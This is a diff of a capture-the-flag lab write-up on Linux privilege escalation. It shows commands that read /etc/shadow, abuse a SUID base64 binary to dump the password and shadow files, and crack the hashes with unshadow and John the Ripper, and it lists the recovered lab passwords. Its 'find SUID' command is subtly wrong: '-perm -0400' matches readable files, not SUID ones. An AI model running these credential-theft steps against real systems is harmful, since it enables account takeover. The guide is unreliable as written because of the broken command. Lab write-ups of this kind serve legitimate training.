@@ -69,4 +69,34 @@ what is the hash of frank's password?
 $ sudo less /etc/shadow
 $6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLH
 ```
-
+## Pirivlege escalation: SUID
+Finding out packages with SUID set
+```
+$ find / -type f -perm -0400 2> /dev/null
+```
+we can use base64 out of the list 
+```
+$ base64 /etc/shadow | base64 --decode
+$ base64 /etc/passwd | base64 --decode
+```
++ Copy down the outputs into files `passwd.txt` and `shadow.txt` 
++ Use the `unshadow` package to combine both
++ Use `John the ripper`
+```
+$ unshadow passwd.txt shadow.txt > passwords.txt
+$ john passwords.txt
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+test123          (gerryconway)
+Password1        (karen)
+Password1        (user2)
+```
++ Which user shares the name of a great comic book writer?
+gerryconway
++ What is the password of user2?
+Password1   
++ What is the content of the flag3.txt file?
+```
+$ ssh user2@MACHINE_IP
+$ cd /home/Ubuntu
+$ base64 flag3.txt | base64 --decode
+```
